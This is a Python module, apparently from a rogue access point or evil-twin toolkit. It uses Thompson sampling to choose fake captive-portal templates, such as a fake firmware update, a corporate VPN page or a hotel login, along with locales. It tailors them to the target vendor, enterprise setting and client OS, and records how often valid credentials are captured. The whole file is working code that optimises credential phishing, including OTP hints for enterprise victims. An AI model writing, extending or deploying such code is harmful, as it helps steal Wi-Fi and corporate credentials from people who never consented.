# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Otimização de templates de portal cativo com bandit Thompson sampling."""

from __future__ import annotations

import logging
from dataclasses import dataclass
from typing import Any, Dict, Mapping, Optional, Sequence, Tuple

logger = logging.getLogger(__name__)

_NP: Any = None
try:
    import numpy as _np

    _NP = _np
except ImportError:
    _np = None  # type: ignore


def _np_rng() -> Any:
    if _NP is None:
        return None
    return _NP.random.default_rng()


@dataclass(frozen=True)
class PortalRecommendation:
    """Recomendação de template, locale e campos de credencial."""

    template: str
    locale: str
    confidence: float
    reasoning: str
    credential_fields: Tuple[str, ...] = ("username", "password")


class PortalOptimizer:
    """Bandit multi-braço com Thompson sampling (Beta-Bernoulli).

    Sem NumPy, usa amostragem por ``random.random`` com prior Beta(1,1).
    Regista conversões por combinação (template, locale, SO) para relatórios.
    """

    def __init__(self, templates: Optional[Sequence[str]] = None, locales: Optional[Sequence[str]] = None) -> None:
        import random as _random

        self._random = _random
        self._templates: Tuple[str, ...] = tuple(
            templates
            or (
                "wifi_connect",
                "captive_hotel",
                "firmware_update",
                "corporate_vpn",
                "isp_login",
            )
        )
        self._locales: Tuple[str, ...] = tuple(locales or ("pt_BR", "en_US", "es_ES"))
        self._alpha: Dict[Tuple[str, str], float] = {}
        self._beta: Dict[Tuple[str, str], float] = {}
        for t in self._templates:
            for loc in self._locales:
                self._alpha[(t, loc)] = 1.0
                self._beta[(t, loc)] = 1.0
        self._stats: Dict[str, Dict[str, Any]] = {
            "attempts": {},
            "successes": {},
            "by_os": {},
        }

    def _sample_theta(self, key: Tuple[str, str]) -> float:
        a = self._alpha[key]
        b = self._beta[key]
        rng = _np_rng()
        if rng is not None:
            return float(rng.beta(a, b))
        # Fallback sem NumPy: aproximação grosseira via média + ruído
        mean = a / (a + b)
        jitter = (self._random.random() - 0.5) * 0.15
        return max(0.0, min(1.0, mean + jitter))

    def recommend(self, context: Dict[str, Any]) -> PortalRecommendation:
        """Escolhe template e locale com maior amostra Thompson dado o contexto.

        Args:
            context: Pode incluir ``target_vendor``, ``enterprise`` (bool),
                ``client_os_distribution`` (mapa SO->peso), ``locale_distribution``,
                ``hour``, ``signal_strength_p50``, etc.

        Returns:
            :class:`PortalRecommendation` com raciocínio textual resumido.
        """
        vendor = str(context.get("target_ap_vendor", context.get("vendor", ""))).lower()
        enterprise = bool(context.get("enterprise", False))
        os_dist: Mapping[str, float] = context.get("client_os_distribution") or {}
        locale_hint = context.get("preferred_locale") or context.get("top_locale")
        hour = float(context.get("hour", 12))

        # Priors fracos por contexto (shift das Betas antes da amostra)
        boosts: Dict[Tuple[str, str], float] = {}
        for t in self._templates:
            for loc in self._locales:
                boost = 0.0
                if enterprise and t in ("corporate_vpn", "firmware_update"):
                    boost += 0.08
                if not enterprise and t in ("wifi_connect", "captive_hotel", "isp_login"):
                    boost += 0.05
                if "huawei" in vendor and t == "firmware_update":
                    boost += 0.06
                if "asus" in vendor and t == "wifi_connect":
                    boost += 0.04
                if locale_hint and str(locale_hint).startswith(loc.split("_")[0]):
                    boost += 0.07
                if 18 <= hour <= 23 and t == "captive_hotel":
                    boost += 0.03
                boosts[(t, loc)] = boost

        best_key: Optional[Tuple[str, str]] = None
        best_sample = -1.0
        for t in self._templates:
            for loc in self._locales:
                key = (t, loc)
                theta = self._sample_theta(key) + boosts.get(key, 0.0)
                if theta > best_sample:
                    best_sample = theta
                    best_key = key

        assert best_key is not None
        tpl, loc = best_key
        top_os = max(os_dist, key=os_dist.get) if os_dist else "unknown"

        fields: Tuple[str, ...]
        if enterprise:
            fields = ("username", "password", "otp_hint")
        else:
            fields = ("password", "wifi_key")

        reasoning = (
            "Thompson sampling sobre (template, locale); contexto vendor={!r}, "
            "enterprise={}, OS dominante={!r}, hora={:.1f}h."
        ).format(vendor or "unknown", enterprise, top_os, hour)

        conf = float(max(0.0, min(1.0, best_sample)))
        return PortalRecommendation(
            template=tpl,
            locale=loc,
            confidence=conf,
            reasoning=reasoning,
            credential_fields=fields,
        )

    def register_outcome(
        self,
        template: str,
        locale: str,
        success: bool,
        client_os: Optional[str] = None,
    ) -> None:
        """Atualiza Betas após uma tentativa de captura.

        Args:
            template: Identificador do template servido.
            locale: Locale usado (ex.: pt_BR).
            success: True se credenciais válidas foram capturadas.
            client_os: SO do cliente, se conhecido.
        """
        key = (template, locale)
        if key not in self._alpha:
            self._alpha[key] = 1.0
            self._beta[key] = 1.0
        if success:
            self._alpha[key] += 1.0
        else:
            self._beta[key] += 1.0

        k = "{}|{}".format(template, locale)
        self._stats["attempts"][k] = self._stats["attempts"].get(k, 0) + 1
        if success:
            self._stats["successes"][k] = self._stats["successes"].get(k, 0) + 1
        if client_os:
            bucket = self._stats["by_os"].setdefault(client_os, {"attempts": 0, "successes": 0})
            bucket["attempts"] += 1
            if success:
                bucket["successes"] += 1

    def report(self) -> Dict[str, Any]:
        """Estatísticas agregadas de desempenho por template/locale/OS."""
        rates: Dict[str, float] = {}
        for k, att in self._stats["attempts"].items():
            succ = self._stats["successes"].get(k, 0)
            rates[k] = float(succ) / float(max(1, att))
        beta_params = {
            "{}|{}".format(t, l): {"alpha": self._alpha[(t, l)], "beta": self._beta[(t, l)]}
            for t in self._templates
            for l in self._locales
            if (t, l) in self._alpha
        }
        return {
            "conversion_by_template_locale": rates,
            "attempts": dict(self._stats["attempts"]),
            "successes": dict(self._stats["successes"]),
            "by_os": dict(self._stats["by_os"]),
            "beta_parameters": beta_params,
        }
